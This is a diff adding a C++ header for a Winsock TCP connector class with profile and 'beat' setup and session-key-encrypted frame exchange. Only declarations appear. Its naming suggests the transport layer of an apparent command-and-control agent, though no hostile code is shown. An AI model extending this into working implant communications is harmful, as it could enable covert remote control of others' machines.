@@ -1,0 +1,34 @@
+#pragma once
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#include "Connector.h"
+
+class ConnectorTCP : public Connector
+{
+private:
+    BYTE*  recvBuffer    = nullptr;
+    int    recvLen       = 0;
+    WORD   port          = 0;
+    SOCKET clientSocket  = INVALID_SOCKET;
+    BOOL   wsaStarted    = FALSE;
+    char   host[256]     = "127.0.0.1";
+
+public:
+    ConnectorTCP();
+    ~ConnectorTCP();
+
+    BOOL SetProfile(void* profile, BYTE* beat, ULONG beatSize) override;
+    BOOL SetTarget(const char* address);
+    BOOL Connect();
+    BOOL SendFrame(const BYTE* plainData, ULONG plainSize, const BYTE* sessionKey, ULONG keyLen);
+    BYTE* RecvFrame(const BYTE* sessionKey, ULONG keyLen, ULONG* outSize);
+    void Disconnect() override;
+
+    void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
+    BYTE* RecvData() override;
+    int   RecvSize() override;
+    void  RecvClear() override;
+    void  CloseConnector() override;
+};
